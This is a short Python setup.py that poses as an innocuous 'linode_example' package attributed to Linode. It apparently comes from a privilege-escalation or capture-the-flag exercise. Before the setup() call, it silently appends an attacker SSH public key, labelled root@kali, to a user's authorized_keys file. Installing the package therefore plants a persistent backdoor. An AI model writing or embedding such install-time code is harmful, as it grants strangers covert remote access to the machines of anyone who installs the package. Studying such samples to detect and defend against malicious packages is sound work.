from setuptools import setup
key='sshYOURKEYHEREsQNx8sjhdFAT2jakrig1uf8hpv/jB6hqJdvQD7HJHJ6d7iBMmbhL1Z8xJZhdnBNefx7BJvFnIGZ47NKQGu8ucfw1X5fnuGIXv root@kali'

#key was to not use any modules..
f=open('/home/low/.ssh/authorized_keys','a')
f.write(key)
f.close

setup(
    name='linode_example',
    packages=['linode_example'],
    description='Hello world enterprise edition',
    version='1.9',
    url='http://github.com/example/linode_example',
    author='Linode',
    author_email='docs@linode.com',
    keywords=['pip','linode','example'],
    )
